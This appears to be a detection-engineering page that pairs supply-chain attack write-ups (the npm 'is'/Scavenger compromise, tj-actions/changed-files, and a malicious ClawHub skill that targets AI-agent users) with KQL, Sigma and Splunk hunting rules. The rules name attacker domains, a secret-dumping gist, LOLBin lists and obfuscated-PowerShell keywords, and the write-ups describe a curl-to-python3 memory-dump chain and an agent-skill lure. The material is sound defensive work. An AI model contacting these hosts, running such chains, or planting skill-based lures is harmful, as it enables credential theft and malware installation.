ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium

    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process

Another npm Supply Chain Attack: The 'is' Package Compromise

StepSecurity
2026-02-11 7 use cases 3 techniques 5 kill-chain phases detected

npm 'is' package versions 3.3.1 and 5.0.0 compromised - critical utility with millions of weekly downloads falls victim to expanding phishing campaign

ATT&CKT1190 T1195.002 T1566
Click any ATT&CK pill below to open it on the Matrix
Phase 1
Reconnaissance
—
Phase 2
Weaponization
—
Phase 3
Delivery
Detected
Phase 4
Exploitation
Detected
Phase 5
Installation
Detected
Phase 6
Command & Control
Detected
Phase 7
Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Scavenger loader/install.js dropped into node_modules (known SHA256 or filename match) · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Scavenger npm supply chain: rundll32 executing node-gyp.dll from node_modules (CVE-2025-54313)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Scavenger npm malware C2 beacon to firebase.su / dieorsuffer.com / smartscreen-api.com
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Scavenger npm supply chain: rundll32 executing node-gyp.dll from node_modules (CVE-2025-54313) AIInstallation High
Detects the Scavenger loader execution chain triggered by the malicious 'is' (3.3.1/5.0.0) and eslint-config-prettier (8.10.1/9.1.1/10.1.6/10.1.7) npm packages. The compromised packages drop a Windows PE32+ DLL named node-gyp.dll into node_modules and invoke it via rundll32.exe from install.js during npm install — a behaviour that is anomalous for a Node.js build dependency. Rationale: The article names malicious versions 3.3.1 and 5.0.0 of 'is' but provides no payload IOCs; cross-referencing Invoke-RE, Snyk, Socket, and Endor Labs identifies the install.js→rundll32→node-gyp.dll chain as the unique execution signature. Rundll32 loading a DLL with that name from a node_modules tree is nearly impossible benignly because node-gyp is a JS build tool, not a DLL provider. Cross-checked against: • https://invokere.com/posts/2025/07/scavenger-malware-distributed-via-eslint-config-prettier-npm-package-supply-chain-compromise/ • https://socket.dev/blog/npm-is-package-hijacked-in-expanding-supply-chain-attack • https://zeropath.com/blog/cve-2025-54313-eslint-config-prettier-supply-chain-malware • https://snyk.io/blog/maintainers-of-eslint-prettier-plugin-attacked-via-npm-supply-chain-malware/ • https://www.endorlabs.com/learn/cve-2025-54313-eslint-config-prettier-compromise----high-severity-but-windows-only
ATT&CKT1218.011 T1195.002 T1059.007
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "rundll32.exe"
| where ProcessCommandLine has "node-gyp.dll"
| where ProcessCommandLine has "node_modules"
    or InitiatingProcessFolderPath has "node_modules"
    or InitiatingProcessCommandLine has "install.js"
    or InitiatingProcessFileName in~ ("node.exe","npm.exe","yarn.exe","pnpm.exe","npm-cli.js")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ParentName  = InitiatingProcessFileName,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith @"\rundll32.exe"
| where CommandLine has "node-gyp.dll"
| where CommandLine has "node_modules"
    or ParentProcessName endswith @"\node.exe"
    or ParentProcessName endswith @"\npm.exe"
    or ParentProcessName endswith @"\yarn.exe"
    or ParentProcessName endswith @"\pnpm.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName, TokenElevationType
| order by TimeGenerated desc
title: Scavenger npm Supply Chain - rundll32 Executing node-gyp.dll
id: a8c4d1e2-9b3a-4f5b-8c7d-1e2f3a4b5c6d
description: Detects the Scavenger malware loader chain delivered via the compromised npm 'is', eslint-config-prettier, eslint-plugin-prettier, synckit, @pkgr/core, napi-postinstall and got-fetch packages (CVE-2025-54313). The postinstall install.js invokes rundll32.exe against a node-gyp.dll dropped inside node_modules.
references:
  - https://www.stepsecurity.io/blog/another-npm-supply-chain-attack-the-is-package-compromise
  - https://invokere.com/posts/2025/07/scavenger-malware-distributed-via-eslint-config-prettier-npm-package-supply-chain-compromise/
  - https://socket.dev/blog/npm-is-package-hijacked-in-expanding-supply-chain-attack
author: SOC Detection Engineering
date: 2025/07/22
tags:
  - attack.t1218.011
  - attack.t1195.002
  - attack.t1059.007
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\rundll32.exe'
  selection_cmd:
    CommandLine|contains:
      - 'node-gyp.dll'
  selection_ctx:
    CommandLine|contains:
      - 'node_modules'
  condition: selection_img and selection_cmd and selection_ctx
falsepositives:
  - None expected; legitimate node-gyp is a JavaScript build tool and does not ship a DLL invoked via rundll32.
level: high
source:windows.sysmon @EventID:1 @Image:(*\\rundll32.exe OR *\\Rundll32.exe OR *\\RUNDLL32.EXE) @CommandLine:(*node-gyp.dll* OR *Node-Gyp.dll*) @CommandLine:(*node_modules* OR *NODE_MODULES*)

Scavenger loader/install.js dropped into node_modules (known SHA256 or filename match) AIDelivery Medium
Detects creation of the Scavenger first-stage node-gyp.dll loader or its install.js dropper inside any node_modules directory, either by exact SHA256 match against published Scavenger samples or by the unusual presence of node-gyp.dll being written under node_modules (the real node-gyp build tool is JavaScript and does not ship a DLL by that name). Rationale: The article points to specific malicious versions of 'is' but provides no hashes or dropped-file IOCs; Invoke-RE's Scavenger analysis published SHA256s for the three artefacts dropped during install and confirms node-gyp.dll is a masquerading name (real node-gyp ships only JS). A file write of node-gyp.dll into node_modules is therefore high-fidelity even without a hash hit, catching variants of the same campaign. Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

| rename All_Email.recipient as user

    [| tstats summariesonly=false count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] tj-actions/changed-files compromise: self-hosted runner egress to nikitastupin memdump gist (CVE-2025-30066)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] tj-actions/changed-files compromise: malicious commit SHA 0e58ed86... referenced on host (CVE-2025-30066) · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] tj-actions/changed-files compromise: memdump.py secret-exfiltration shell pattern on runner (CVE-2025-30066)
tj-actions/changed-files compromise: self-hosted runner egress to nikitastupin memdump gist (CVE-2025-30066) AIDelivery Medium
Detects when a host (typically a self-hosted GitHub Actions runner) makes an outbound HTTP request to the public gist hosting memdump.py — the secret-extraction script delivered by the retroactively re-tagged tj-actions/changed-files Action. The gist ID 30e525b776c409e03c2d6f328f254965 owned by user nikitastupin is hard-coded into the malicious bash payload and is not referenced by any legitimate workflow. Rationale: The gist URL containing user 'nikitastupin' and ID '30e525b776c409e03c2d6f328f254965' is an article-specific, unique IOC explicitly named in the decoded base64 payload. No legitimate workflow fetches this gist. Single match = positive confirmation a compromised tj-actions/changed-files version executed. Cross-checked against: • https://nvd.nist.gov/vuln/detail/CVE-2025-30066 • https://github.com/tj-actions/changed-files/issues/2463 • https://cloud.google.com/blog/topics/threat-intelligence/tj-actions-github-supply-chain-compromise
ATT&CKT1195.002 T1567.001 T1105
Data sourcesWeb Network_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "nikitastupin/30e525b776c409e03c2d6f328f254965"
    or (RemoteUrl has "gist.githubusercontent.com" and RemoteUrl has "nikitastupin")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessAccountName, RemoteUrl, RemoteIP, RemotePort, Protocol
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where Url has "nikitastupin/30e525b776c409e03c2d6f328f254965"
    or (Url has "gist.githubusercontent.com" and Url has "nikitastupin")
| project TimeGenerated, DvcHostname, SrcIpAddr, SrcHostname, SrcUsername, DstHostname, DstIpAddr, Url, NetworkApplicationProtocol, EventVendor, EventProduct
| order by TimeGenerated desc

tj-actions/changed-files compromise: memdump.py secret-exfiltration shell pattern on runner (CVE-2025-30066) AIActions on Objectives High
Detects process-create events on Linux GitHub Actions runners whose command line contains the unique strings from the decoded malicious payload: the nikitastupin gist ID, memdump.py, the target process name 'Runner.Worker', the bespoke '"isSecret":true' grep filter used to isolate secrets in dumped memory, or the double `base64 -w 0` encoding used to wrap the dumped secrets for inclusion in build logs. Rationale: All five payload strings appear in the article's decoded bash blob and are unique to this attack: the gist ID identifies the loader, memdump.py the script, Runner.Worker is the GHA agent process the script searches /proc for, '"isSecret":true' is the bespoke grep pattern targeting the secret JSON shape in runner memory, and 'base64 -w 0 | base64 -w 0' is the unusual double-encoding the adversary uses to smuggle the dump through the build log. Cross-checked against: • https://nvd.nist.gov/vuln/detail/CVE-2025-30066 • https://github.com/tj-actions/changed-files/issues/2463 • https://cloud.google.com/blog/topics/threat-intelligence/tj-actions-github-supply-chain-compromise
ATT&CKT1552.001 T1059.004 T1195.002 T1003

DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has_any (
        "nikitastupin/30e525b776c409e03c2d6f328f254965",
        "memdump.py",
        "Runner.Worker",
        @"""isSecret"":true",
        "base64 -w 0 | base64 -w 0"
    )
   or InitiatingProcessCommandLine has_any (
        "nikitastupin/30e525b776c409e03c2d6f328f254965",
        "memdump.py",
        @"""isSecret"":true"
    )
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath,
          InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)

        "nikitastupin/30e525b776c409e03c2d6f328f254965",

title: tj-actions changed-files Compromise - memdump.py Secret Exfiltration Shell Pattern (CVE-2025-30066)
id: 4d3c8b2a-1e5f-4a6b-9d7c-2b8e3f4a5c1d
status: experimental
description: |
  Detects the bash/python payload chain dropped by the compromised tj-actions/changed-files
  GitHub Action. The retroactively re-tagged versions execute a bash one-liner that pipes
  curl of memdump.py from nikitastupin's gist into sudo python3, then filters Runner.Worker
  process-memory output through a unique grep for '"isSecret":true' and double-base64-encodes
  the result for emission to the GitHub Actions build log.
references:
  - https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
  - https://nvd.nist.gov/vuln/detail/CVE-2025-30066
  - https://github.com/tj-actions/changed-files/issues/2463
author: SOC Detection Engineering
date: 2025/03/14
tags:
  - attack.credential_access
  - attack.t1552.001
  - attack.t1059.004
  - attack.t1195.002
  - attack.t1003
logsource:
  category: process_creation
  product: linux
detection:
  selection_gist:
    CommandLine|contains: 'nikitastupin/30e525b776c409e03c2d6f328f254965'
  selection_memdump:
    CommandLine|contains: 'memdump.py'
  selection_runner:
    CommandLine|contains: 'Runner.Worker'
  selection_secret_grep:
    CommandLine|contains: '"isSecret":true'
  selection_double_b64:
    CommandLine|contains: 'base64 -w 0 | base64 -w 0'
  condition: 1 of selection_*
falsepositives:
  - Security researchers reproducing the exploit in an isolated test repository
level: high
source:linux.auditd @auditd.type:EXECVE @process.command_line:(*nikitastupin\/30e525b776c409e03c2d6f328f254965* OR *memdump.py* OR *Runner.Worker*)

tj-actions/changed-files compromise: malicious commit SHA 0e58ed86... referenced on host (CVE-2025-30066) AIInstallation High
Hunt query for the malicious commit hash 0e58ed8671d6b60d0890c21b07f8835ace038e67 across endpoint process and network telemetry. Every retroactively re-tagged version of tj-actions/changed-files (v1.0.0 → v44.5.1, v35.7.7-sec, v5) points to this single SHA, so the hash appears in git checkout / fetch command lines on self-hosted runners and in GitHub Action download URLs when a workflow consumed the compromised action between 2025-03-14 16:00 UTC and 2025-03-15 22:00 UTC. Rationale: The article explicitly enumerates the retroactively-applied tag list and confirms every tag (v1.0.0 through v44.5.1, v5, v35.7.7-sec) resolves to the single commit 0e58ed8671d6b60d0890c21b07f8835ace038e67 — a hash unique to this incident. A free-text hunt across process and network telemetry for the SHA literal scopes blast radius after the fact and catches any self-hosted runner that fetched the action between 2025-03-14 16:00 UTC and 2025-03-15 22:00 UTC. Sigma is omitted because the detection joins multiple log categories. Cross-checked against: • https://nvd.nist.gov/vuln/detail/CVE-2025-30066 • https://github.com/tj-actions/changed-files/issues/2463 • https://cloud.google.com/blog/topics/threat-intelligence/tj-actions-github-supply-chain-compromise

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities

| where CveId in~ ("CVE-2025-30066")

| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-30066")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,

| order by VulnerabilitySeverityLevel asc, DeviceName asc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("0e58ed8671d6b60d0890c21b07f8835ace038e67") or SHA1 in~ ("0e58ed8671d6b60d0890c21b07f8835ace038e67") or MD5 in~ ("0e58ed8671d6b60d0890c21b07f8835ace038e67")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("0e58ed8671d6b60d0890c21b07f8835ace038e67") or SHA1 in~ ("0e58ed8671d6b60d0890c21b07f8835ace038e67") or MD5 in~ ("0e58ed8671d6b60d0890c21b07f8835ace038e67")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["0e58ed8671d6b60d0890c21b07f8835ace038e67"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
PowerShell encoded / obfuscated command Exploitation High
Encoded or obfuscated PowerShell — common across loaders, recon, and post-exploitation.

title: Obfuscated / Encoded PowerShell Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
status: experimental
description: |
    PowerShell launched with -EncodedCommand, base64 strings, hidden
    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
    .WebClient.DownloadString — combinations indicating evasion.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1027/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1027
    - attack.execution
    - attack.defense-evasion
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_args:
        CommandLine|contains:
            - '-enc '
            - 'EncodedCommand'
            - 'FromBase64String'
            - 'Invoke-Expression'
            - 'IEX('
            - 'DownloadString'
            - 'Net.WebClient'
            - '-w hidden'
            - '-WindowStyle Hidden'
            - '-nop'
            - '-NoProfile'
            - '-ep bypass'
            - '-ExecutionPolicy Bypass'
    condition: selection_image and selection_args
falsepositives:
    - DevOps tooling that legitimately uses encoded command for
      cross-shell escaping
level: high
ENDPOINT

        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name

How a Malicious Google Skill on ClawHub Tricks Users Into Installing Malware

Snyk
2026-02-10 8 use cases 4 techniques 7 kill-chain phases detected

Breaking: Snyk researchers uncover a malicious "Google" skill on ClawHub that tricks users into installing malware via a fake OpenClaw dependency. Learn how the attack works and how to protect your AI agents.

ATT&CKT1053.005 T1190 T1195.002 T1528
Domainssetup-service.com rentry.co/openclaw-core github.com/denboss99/openclaw-core github.com/aztr0nutz/NET_NINJA.v1.2

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer). → [LLM] SKILL.md file written referencing fabricated openclaw-core prerequisite (ClawHub skill social engineering hook)
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Pastebin-piping stager retrieved from rentry.co/openclaw-core (macOS/Linux ClawHub skill) · [LLM] Download of openclawcore-1.0.3.zip from denboss99 GitHub release (Windows OpenClaw skill payload)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Scheduled task created with suspicious image / encoded args
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Endpoint contact with attacker C2 setup-service.com (OpenClaw skill stager) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → OAuth consent / suspicious app grant
Endpoint contact with attacker C2 setup-service.com (OpenClaw skill stager) AICommand & Control High
Hunts DNS resolution or outbound network connection to setup-service.com, the attacker-controlled domain used to host the second-stage script for the OpenClaw ClawHub malicious skill campaign (google-qx4 / NET_NiNjA). Any contact with this domain is high-confidence compromise. Rationale: setup-service.com is named in the Snyk article as the attacker-controlled domain hosting the decoded base64 stager script that the rentry.co/openclaw-core pastebin pipes into the user's shell. Any resolution or connection by an endpoint is high-fidelity since the domain has no legitimate corporate use. Cross-checked against: • https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/
ATT&CKT1071.001 T1105
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researchers detonating the sample in a corporate sandbox without segmentation
  • Threat intel team browsing the article and clicking a live link to the IOC
  • DNS sinkhole / RPZ logs replaying historic queries during a tune-up
  • Endpoint sandbox/EDR vendor product fetching the sample for analysis
  • Web filter health-check that probes the domain to verify category
Suppression filter
| where not(InitiatingProcessFileName in~ ("MsSense.exe","MpCmdRun.exe","SenseIR.exe","defender.exe","SecurityHealthService.exe") and InitiatingProcessFolderPath has_any ("\\Windows Defender\\","\\Microsoft\\Sense\\"))
Response runbook
Step 1 — Triage: identify the initiating process and command line for the connection. If parent is a shell (cmd/powershell/bash/zsh) invoked manually by an interactive user immediately after they ran an AI agent (OpenClaw / Clawdbot), treat as confirmed. Pull SKILL.md files under the user's agent workspace. Step 2 — Contain: isolate the device via Defender / NDR, terminate the shell/curl tree, kill any persistence the second-stage may have planted (scheduled tasks, LaunchAgents, ~/.bash_profile additions, AppData\Roaming binaries). Reset the user's Google OAuth tokens and any IDE/agent credentials. Step 3 — Hunt: pivot on the same user/device for downloads from github.com/denboss99/openclaw-core and rentry.co/openclaw-core, and search SKILL.md files for the strings 'openclaw-core', 'google-qx4', 'NET_NiNjA'.
union isfuzzy=true
(DeviceNetworkEvents
 | where Timestamp > ago(30d)
